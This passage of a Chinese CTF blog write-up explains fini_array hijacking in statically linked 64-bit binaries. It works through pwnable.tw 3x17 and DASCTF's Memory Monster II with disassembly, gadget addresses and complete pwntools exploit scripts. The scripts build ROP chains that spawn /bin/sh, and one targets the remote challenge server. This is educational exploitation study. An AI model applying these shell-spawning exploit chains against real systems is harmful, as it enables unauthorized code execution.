class="number">3</span></span><br><span class="line">.text:<span class="number">000000000040297B</span>                 jz      <span class="keyword">short</span> loc_402996</span><br><span class="line">.text:<span class="number">000000000040297</span>D                 lea     rbx, [rax<span class="number">-1</span>]</span><br><span class="line">.text:<span class="number">0000000000402981</span>                 nop     dword ptr [rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000402988</span></span><br><span class="line">.text:<span class="number">0000000000402988</span> loc_402988:                             ; CODE XREF: __libc_csu_fini+<span class="number">34</span>↓j</span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br><span class="line">.text:<span class="number">000000000040298</span>C                 sub     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000402990</span>                 cmp     rbx, <span class="number">0F</span>FFFFFFFFFFFFFFFh</span><br><span class="line">.text:<span class="number">0000000000402994</span>                 jnz     <span class="keyword">short</span> loc_402988</span><br><span class="line">.text:<span class="number">0000000000402996</span></span><br><span class="line">.text:<span class="number">0000000000402996</span> loc_402996:                             ; CODE XREF: __libc_csu_fini+<span class="number">1B</span>↑j</span><br><span class="line">.text:<span class="number">0000000000402996</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040299</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040299B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040299</span>C                 jmp     sub_48E32C</span><br><span class="line">.text:<span class="number">000000000040299</span>C ; &#125; <span class="comment">// starts at 402960</span></span><br><span class="line">.text:<span class="number">000000000040299</span>C __libc_csu_fini endp</span><br></pre></td></tr></table></figure><p>注意以下这三行源码，是劫持 fini_array 实现无限写进行 ROP 的关键：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 fini_array[0] 的值加载到 rbp</span></span><br><span class="line">.text:<span class="number">0000000000402968</span>                 lea     rbp, _fini_array_0</span><br><span class="line"><span class="comment">//经过一系列运算后，这里会 call fini_array[1] ，也就是调用存储在 fini_array[1] 的指针</span></span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br><span class="line"><span class="comment">//调用完 fini_array[1] 之后再次进过一系列运算，这里会 call fini_array[0]</span></span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>看一下 fini_array 的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:00000000004B40F0 _fini_array     segment para public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                 assume cs:_fini_array</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                 ;org <span class="number">4B</span>40F0h</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0 _fini_array_0   dq offset sub_401B00    ; DATA XREF: .text:<span class="number">000000000040291</span>C↑o</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                                         ; __libc_csu_fini+<span class="number">8</span>↑o</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F8                 dq offset sub_401580</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F8 _fini_array     ends</span><br></pre></td></tr></table></figure><p>这里明确知道了 fini_array 里面存储了两个指针，调用顺序为：先 fini_array[1] ，再 fini_array[0] 。那么**如果我们把 fini_array[1] 覆盖为函数 A 的地址，fini_array[0] 覆盖为 __libc_csu_fini 的地址 **，当退出 main 后，程序会这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini</span><br><span class="line"></span><br><span class="line">__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini</span><br><span class="line"></span><br><span class="line">__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这个循环就会一直持续到 fini_array[0] 被覆盖为其他值。</p><p>还有个点就是上面提到的源码中的 <code>lea     rbp, _fini_array_0</code> ，将 rbp 的值修改为 fini_array[0] 所在的地址，那么配合 <code>leave|ret</code> 就能将栈迁移到 fini_array + 0x10 的地址，我们就将利用函数放在这个地方。</p><h2 id="pwnable-tw-3x17"><a href="#pwnable-tw-3x17" class="headerlink" title="pwnable.tw-3x17"></a>pwnable.tw-3x17</h2><h3 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h3><p>静态链接的 64 位程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skye:~/CTF学习/fini_array劫持$ file 317</span><br><span class="line">317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped</span><br></pre></td></tr></table></figure><p>checksec 检查是没有 canary 但是根据汇编去检查<strong>是有 canary 保护</strong>的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-07-07-dmQW7YTLcYVKJeGN.png"></p><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，或者通过字符串定位到 main 函数位置（shift+F12）。</p><p>main 函数中一个任意地址写入 0x18 的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重命名部分函数名</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write_fun(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    read_fun(<span class="number">0</span>, &amp;buf, <span class="number">0x18</span>uLL);<span class="comment">//读取地址</span></span><br><span class="line">    v4 = (<span class="keyword">char</span> *)(<span class="keyword">signed</span> <span class="keyword">int</span>)sub_40EE70((__int64)&amp;buf);</span><br><span class="line">    write_fun(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    read_fun(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);<span class="comment">//向读取地址写入内容</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v6 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><p>这条题目还有其他解法，因为用这条题目学习 <strong>fini_array 劫持</strong>就记录这种做法。其他解法：<a href="https://kirin-say.top/2019/02/08/pwnable-tw-3x17/">pwnable.tw_3x17</a></p></blockquote><p>静态编译程序只能用它的有东西 getshell 。写 shellcode 估计要 mprotect 给内容加上运行权限绕过 NX 保护；写个系统调用号可行一点。</p><p>那就需要用到写入功能函数了，如果需要符合本文学习内容，就需要一个任意地址写的函数，刚好 main 函数就是。现在明确思路：</p><ol><li><p>将 fini_array[1] 覆盖为 main 函数地址；fini_array[0] 覆盖为 __libc_start_fini 地址；</p></li><li><p>依次向 fini_array + 0x10 写入系统调用号利用代码；</p></li><li><p>写入完成后，将 fini_array[0] 覆盖为 <code>leave|ret</code>，将栈迁移到 fini_array + 0x10;</p></li></ol><blockquote><p>构建的系统调用命令：syscall(0x3b,addr_of_binsh,0,0)</p><p>相当于：execve(addr_of_binsh,0,0)</p><p>系统调用号查询：<a href="https://www.mrskye.cn/archives/168/">https://www.mrskye.cn/archives/168/</a></p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./317&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line">elf = process(<span class="string">&quot;./317&quot;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">esp = fini_array + <span class="number">0x10</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"> </span><br><span class="line">rop_syscall = <span class="number">0x471db5</span></span><br><span class="line">rop_pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">rop_pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">rop_pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B419A</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(data)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># hijack fini_array</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    write(fini_array,p64(libc_csu_fini) + p64(main_addr))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># rop chain</span></span><br><span class="line">    write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    write(esp,p64(rop_pop_rax))</span><br><span class="line">    write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">    write(esp+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">    write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">    write(esp+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">    write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write(esp+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">    write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write(esp+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># stack pivoting</span></span><br><span class="line">    write(fini_array,p64(leave_ret) + p64(ret))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://bbs.pediy.com/thread-259298.htm">[原创]pwnable.tw新手向write up(二) 3×17-x64静态编译程序的fini_array劫持</a></li></ul><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><blockquote><p>题目来源 DASCTF 五月赛，作者为 TaQini ，[附件]([<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory%20Monster%20II]">https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory%20Monster%20II]</a>(<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory">https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory</a> Monster II))</p><p>这里和上面那条机会一样，下面是独立完成，详细记录一下</p></blockquote><h3 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h3><p>checksec 检查是没有 canary 但是根据汇编去检查<strong>是有 canary 保护</strong>的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，没有卵用只修复了两个函数，但是能看到 _start 函数：（重命名部分函数）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>00                 <span class="keyword">public</span> start</span><br><span class="line">.text:<span class="number">0000000000401B</span>00 start           proc near               ; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401B</span>00 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>00                 <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">.text:<span class="number">0000000000401B</span>02                 mov     r9, rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>05                 pop     rsi</span><br><span class="line">.text:<span class="number">0000000000401B</span>06                 mov     rdx, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>09                 <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line">.text:<span class="number">0000000000401B</span>0D                 push    rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>0E                 push    rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>0F                 mov     r8, offset __libc_start_fini</span><br><span class="line">.text:<span class="number">0000000000401B</span>16                 mov     rcx, offset __libc_start_init</span><br><span class="line">.text:<span class="number">0000000000401B</span>1D                 mov     rdi, offset main</span><br><span class="line">.text:<span class="number">0000000000401B</span>24                 db      <span class="number">67</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>24                 call    sub_4020B0</span><br><span class="line">.text:<span class="number">0000000000401B</span>2A                 hlt</span><br><span class="line">.text:<span class="number">0000000000401B</span>2A ; &#125; <span class="comment">// starts at 401B00</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>2A start           endp</span><br></pre></td></tr></table></figure><p>依据规律知道三个 mov 依次是处理 __libc_start_fini、__libc_start_init、main 。从这里获取到关键参数： __libc_start_fini、main 地址。</p><p>然后 gdb 调试，断点打在 __libc_start_fini ，一直运行到 call 指令，rbp 存储的值就是 fini_array[0] 的地址 0x4b80b0 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-07-07-Fao8iqPT0I2CQDVU.png"></p><p>leave_ret 和 ret 通过 ROPgadget 直接能查到；rax、rdi、rsi、rdx 传参 gadget 也能找到，这几个 gadget 找那种只穿一个寄存器的：<code>pop rax;ret</code>。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack fini</span></span><br><span class="line">libc_csu_fini = <span class="number">0x0402CB0</span></span><br><span class="line">main_addr = <span class="number">0x0401C1D</span></span><br><span class="line">fini_array = <span class="number">0x4b80b0</span></span><br><span class="line">esp = fini_array + <span class="number">0x10</span></span><br><span class="line">leave_ret = <span class="number">0x0401cf3</span></span><br><span class="line">ret = <span class="number">0x0401016</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line">rop_syscall = <span class="number">0x46F745</span></span><br><span class="line">rop_pop_rax = <span class="number">0x0000000000448fcc</span></span><br><span class="line">rop_pop_rdx = <span class="number">0x0000000000448415</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x0000000000406f80</span></span><br><span class="line">rop_pop_rdi = <span class="number">0x0000000000401746</span></span><br><span class="line">bin_sh_addr = <span class="number">0x492895</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;addr:&#x27;</span>,p64(addr))</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack fini_array</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x0402CB0&#x27;</span>)</span><br><span class="line">write(fini_array,p64(libc_csu_fini) + p64(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">write(esp,p64(rop_pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack pivoting</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">write(fini_array,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="补充总结"><a href="#补充总结" class="headerlink" title="补充总结"></a>补充总结</h3><h5 id="怎么找-fini-array-？"><a href="#怎么找-fini-array-？" class="headerlink" title="怎么找 fini_array ？"></a>怎么找 fini_array ？</h5><p>首先 fini_array 是 __libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。</p><h6 id="64-位静态链接程序"><a href="#64-位静态链接程序" class="headerlink" title="64 位静态链接程序"></a>64 位静态链接程序</h6><p>fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。</p><p>在<a href="https://www.mrskye.cn/archives/173">劫持 64 位静态程序 fini_array 进行 ROP 攻击</a>里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：</p><p>首先 <code>readelf -h 程序名</code> 查看程序加载入口地址。</p><p>gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 __libc_csu_fini 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A60                 public start</span><br><span class="line">.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A60 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A60                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A62                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A65                 pop     rsi</span><br><span class="line">.text:0000000000401A66                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A6D                 push    rax</span><br><span class="line">.text:0000000000401A6E                 push    rsp</span><br><span class="line">.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.text:0000000000401A7D                 mov     rdi, offset main</span><br><span class="line">.text:0000000000401A84                 db      67h</span><br><span class="line">.text:0000000000401A84                 call    __libc_start_main</span><br><span class="line">.text:0000000000401A8A                 hlt</span><br><span class="line">.text:0000000000401A8A ; &#125; // starts at 401A60</span><br><span class="line">.text:0000000000401A8A start           endp</span><br></pre></td></tr></table></figure><p>然后 <code>x /20i addr</code> 查看该地址开始的汇编，找到 <code>lea    rbp,[rip+0xb***1] # 0x4***f0</code> ，这个地址就是 fini_array[1] 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20i 0x402bd0</span></span><br><span class="line">  0x402bd0 &lt;__libc_csu_fini&gt;:    push   rbp</span><br><span class="line">  0x402bd1 &lt;__libc_csu_fini+1&gt;:    lea    rax,[rip+0xb24e8]        # 0x4***c0 </span><br><span class="line">  0x402bd8 &lt;__libc_csu_fini+8&gt;:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 </span><br><span class="line">  0x402bdf &lt;__libc_csu_fini+15&gt;:    push   rbx</span><br><span class="line">  0x402be0 &lt;__libc_csu_fini+16&gt;:    sub    rax,rbp</span><br><span class="line">  0x402be3 &lt;__libc_csu_fini+19&gt;:    sub    rsp,0x8</span><br><span class="line">  0x402be7 &lt;__libc_csu_fini+23&gt;:    sar    rax,0x3</span><br><span class="line">  0x402beb &lt;__libc_csu_fini+27&gt;:    je     0x402c06 &lt;__libc_csu_fini+54&gt;</span><br><span class="line">  0x402bed &lt;__libc_csu_fini+29&gt;:    lea    rbx,[rax-0x1]</span><br><span class="line">  0x402bf1 &lt;__libc_csu_fini+33&gt;:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">  0x402bf8 &lt;__libc_csu_fini+40&gt;:    call   QWORD PTR [rbp+rbx*8+0x0]</span><br><span class="line">  0x402bfc &lt;__libc_csu_fini+44&gt;:    sub    rbx,0x1</span><br><span class="line">  0x402c00 &lt;__libc_csu_fini+48&gt;:    cmp    rbx,0xffffffffffffffff</span><br><span class="line">  0x402c04 &lt;__libc_csu_fini+52&gt;:    jne    0x402bf8 &lt;__libc_csu_fini+40&gt;</span><br><span class="line">  0x402c06 &lt;__libc_csu_fini+54&gt;:    add    rsp,0x8</span><br><span class="line">  0x402c0a &lt;__libc_csu_fini+58&gt;:    pop    rbx</span><br><span class="line">  0x402c0b &lt;__libc_csu_fini+59&gt;:    pop    rbp</span><br><span class="line">  0x402c0c &lt;__libc_csu_fini+60&gt;:    jmp    0x48f52c &lt;_fini&gt;</span><br></pre></td></tr></table></figure><h6 id="64-位动态链接程序"><a href="#64-位动态链接程序" class="headerlink" title="64 位动态链接程序"></a>64 位动态链接程序</h6><p>fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。</p><p>gdb 输入 <code>elf</code> 找 <code>.fini_array</code> ，开始地址就是 fini_array[0] </p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png"></p><p>或者 IDA <code>ctrl+s</code> 找 .fini_array 分段 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png"></p><p>64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。</p><h6 id="静态动态利用方式小结"><a href="#静态动态利用方式小结" class="headerlink" title="静态动态利用方式小结"></a>静态动态利用方式小结</h6><p>动态程序目前就遇到 <code>2015 hacklu bookstore</code> 